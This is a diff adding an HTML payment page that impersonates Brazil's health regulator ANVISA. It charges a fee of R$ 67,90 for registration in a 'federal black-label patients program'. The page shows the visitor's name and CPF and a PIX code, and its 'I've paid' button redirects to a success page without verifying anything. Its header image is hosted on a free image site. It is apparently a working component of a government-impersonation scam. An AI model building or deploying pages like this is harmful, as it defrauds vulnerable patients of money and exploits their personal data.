@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pagamento da Taxa TTPS | ANVISA</title>
+  <link href="https://cdn.tailwindcss.com" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f8f9fa;
+    }
+    
+    .main-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1351b4;
+      margin-bottom: 8px;
+    }
+    
+    .subtitle {
+      font-size: 16px;
+      color: #666666;
+      margin-bottom: 24px;
+    }
+    
+    .sticky-header {
+      position: sticky;
+      top: 0;
+      background-color: white;
+      z-index: 50;
+      transition: box-shadow 0.3s ease;
+    }
+    
+    .sticky-header.shadow {
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    
+    .payment-container {
+      background-color: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+      overflow: hidden;
+      max-width: 700px;
+      margin: 0 auto;
+    }
+    
+    .payment-header {
+      background-color: #f0f7ff;
+      padding: 20px;
+      border-bottom: 1px solid #e0e7ff;
+    }
+    
+    .payment-content {
+      padding: 30px;
+    }
+    
+    .payment-box {
+      background-color: #f9fafb;
+      border-radius: 8px;
+      padding: 20px;
+      margin-bottom: 24px;
+      border: 1px solid #e5e7eb;
+    }
+    
+    .payment-title {
+      font-size: 18px;
+      font-weight: 600;
+      color: #1351b4;
+      margin-bottom: 16px;
+    }
+    
+    .payment-details {
+      margin-bottom: 16px;
+    }
+    
+    .payment-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 8px;
+      padding-bottom: 8px;
+      border-bottom: 1px dashed #e5e7eb;
+    }
+    
+    .payment-label {
+      font-size: 14px;
+      color: #6b7280;
+    }
+    
+    .payment-value {
+      font-size: 14px;
+      font-weight: 500;
+      color: #4b5563;
+    }
+    
+    .payment-total {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 16px;
+      padding-top: 16px;
+      border-top: 1px solid #e5e7eb;
+    }
+    
+    .pix-container {
+      border: 1px solid #e5e7eb;
+      border-radius: 8px;
+      padding: 20px;
+      margin-bottom: 24px;
+      text-align: center;
+    }
+    
+    .pix-qrcode {
+      margin: 20px auto;
+      max-width: 200px;
+    }
+    
+    .pix-code {
+      background-color: #f9fafb;
+      border: 1px dashed #d1d5db;
+      border-radius: 4px;
+      padding: 12px;
+      font-family: monospace;
+      font-size: 14px;
+      color: #4b5563;
+      word-break: break-all;
+      margin-bottom: 16px;
+    }
+    
+    .btn {
+      padding: 12px 20px;
+      border-radius: 6px;
+      font-weight: 600;
+      font-size: 16px;
+      transition: all 0.2s ease;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      width: 100%;
+    }
+    
+    .btn-primary {
+      background-color: #1351b4;
+      color: white;
+      border: none;
+    }
+    
+    .btn-secondary {
+      background-color: #f3f4f6;
+      color: #4b5563;
+      border: 1px solid #d1d5db;
+      margin-top: 12px;
+    }
+    
+    .copy-button {
+      background-color: #1351b4;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      padding: 8px 12px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      transition: all 0.2s ease;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://i.ibb.co/btmZWCB/IMG-3113.jpg" alt="Government header" class="w-screen">
+  
+  <main class="max-w-3xl mx-auto px-4 py-6">
+    <div class="mb-6">
+      <h2 class="main-title">
+        Pagamento da Taxa TTPS
+      </h2>
+      <p class="subtitle">
+        Registro no Programa Federal de Pacientes Tarja Preta
+      </p>
+    </div>
+    
+    <div class="payment-container">
+      <div class="payment-header">
+        <h3 class="text-lg font-semibold text-[#0c326f]">Taxa TTPS - R$ 67,90</h3>
+      </div>
+      
+      <div class="payment-content">
+        <div class="payment-box">
+          <h4 class="payment-title">Detalhes do Pagamento</h4>
+          
+          <div class="payment-details">
+            <div class="payment-row">
+              <div class="payment-label">Cliente:</div>
+              <div class="payment-value customer-name">{{ user_data.name }}</div>
+            </div>
+            
+            <div class="payment-row">
+              <div class="payment-label">CPF:</div>
+              <div class="payment-value customer-cpf">{{ user_data.cpf }}</div>
+            </div>
+            
+            <div class="payment-row">
+              <div class="payment-label">Tipo de Taxa:</div>
+              <div class="payment-value">Taxa Tarja Preta Seguro (TTPS)</div>
+            </div>
+            
+            <div class="payment-row">
+              <div class="payment-label">Finalidade:</div>
+              <div class="payment-value">Registro no Programa Federal</div>
+            </div>
+            
+            <div class="payment-row">
+              <div class="payment-label">Protocolo:</div>
+              <div class="payment-value" id="protocol">TTPS-2504-{{ random_id }}</div>
+            </div>
+          </div>
+          
+          <div class="payment-total">
+            <div class="payment-label">Valor Total:</div>
+            <div class="payment-value">R$ 67,90</div>
+          </div>
+        </div>
+        
+        <div class="pix-container" id="pixPaymentSection">
+          <h4 class="text-lg font-semibold text-[#0c326f] mb-4">
+            Pagamento via PIX
+          </h4>
+          
+          <p class="text-sm text-gray-600 mb-4">
+            Escaneie o QR Code abaixo ou copie o código PIX para realizar o pagamento.
+          </p>
+          
+          <img class="pix-qrcode" id="pixQrCode" src="{{ qr_code_url }}" alt="QR Code PIX">
+          
+          <div class="mt-4 mb-2">
+            <button class="copy-button" id="copyPixButton">
+              <i class="fas fa-copy"></i> Copiar Código PIX
+            </button>
+          </div>
+          
+          <div class="pix-code" id="pixCode">
+            {{ pix_code }}
+          </div>
+        </div>
+        
+        <div class="mt-6">
+          <button id="checkPaymentButton" class="btn btn-primary">
+            <i class="fas fa-sync-alt"></i> Verifiquei o Pagamento
+          </button>
+          
+          <a href="/ttps" class="btn btn-secondary">
+            <i class="fas fa-arrow-left"></i> Voltar
+          </a>
+        </div>
+      </div>
+    </div>
+  </main>
+  
+  <script>
+    // Função para recuperar os dados do usuário do localStorage
+    function getUserPaymentData() {
+      try {
+        const userDataStr = localStorage.getItem('userPaymentData');
+        if (!userDataStr) {
+          console.log('Nenhum dado de pagamento do usuário encontrado no localStorage');
+          return null;
+        }
+        
+        const userData = JSON.parse(userDataStr);
+        console.log('Dados de pagamento do usuário recuperados:', userData);
+        return userData;
+      } catch (e) {
+        console.error('Erro ao recuperar dados do usuário do localStorage:', e);
+        return null;
+      }
+    }
+    
+    document.addEventListener('DOMContentLoaded', function() {
+      // Recuperar os dados do usuário do localStorage
+      const userData = getUserPaymentData();
+      
+      // Verificamos se existem dados no localStorage
+      if (userData) {
+        // Mostre os dados do usuário na página, se houver elementos com os IDs apropriados
+        const customerNameElements = document.querySelectorAll('.customer-name');
+        const customerCpfElements = document.querySelectorAll('.customer-cpf');
+        
+        customerNameElements.forEach(el => {
+          if (userData.name) el.textContent = userData.name;
+        });
+        
+        customerCpfElements.forEach(el => {
+          if (userData.cpf) {
+            // Formatar CPF
+            const cpf = userData.cpf.replace(/\D/g, '');
+            if (cpf.length === 11) {
+              el.textContent = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+            } else {
+              el.textContent = userData.cpf;
+            }
+          }
+        });
+      }
+      
+      const copyPixButton = document.getElementById('copyPixButton');
+      const pixCodeElement = document.getElementById('pixCode');
+      
+      // Função para copiar o código PIX
+      if (copyPixButton && pixCodeElement) {
+        copyPixButton.addEventListener('click', function() {
+          const pixCode = pixCodeElement.textContent.trim();
+          navigator.clipboard.writeText(pixCode).then(function() {
+            copyPixButton.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
+            setTimeout(function() {
+              copyPixButton.innerHTML = '<i class="fas fa-copy"></i> Copiar Código PIX';
+            }, 2000);
+          });
+        });
+      }
+      
+      // Função para verificar pagamento
+      const checkPaymentButton = document.getElementById('checkPaymentButton');
+      if (checkPaymentButton) {
+        checkPaymentButton.addEventListener('click', function() {
+          window.location.href = '/ttps_sucesso';
+        });
+      }
+    });
+  </script>
+</body>
+</html>
